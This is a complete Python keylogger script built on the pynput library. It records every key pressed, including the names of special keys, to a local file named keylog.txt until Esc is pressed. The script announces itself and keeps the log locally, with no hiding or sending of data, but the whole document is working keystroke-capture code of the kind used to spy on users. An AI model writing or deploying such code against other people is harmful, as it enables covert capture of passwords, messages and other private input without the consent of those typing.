from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    """This function is called whenever a key is pressed."""
    try:
        # For alphanumeric keys, write the character
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # For special keys, write the key name
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"An error occurred: {e}")


def on_release(key):
    """This function is called whenever a key is released."""
    if key == keyboard.Key.esc:
        # Stop listener by returning False
        return False

# Set up the listener
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()

print("Keylogger stopped. Data saved to keylog.txt")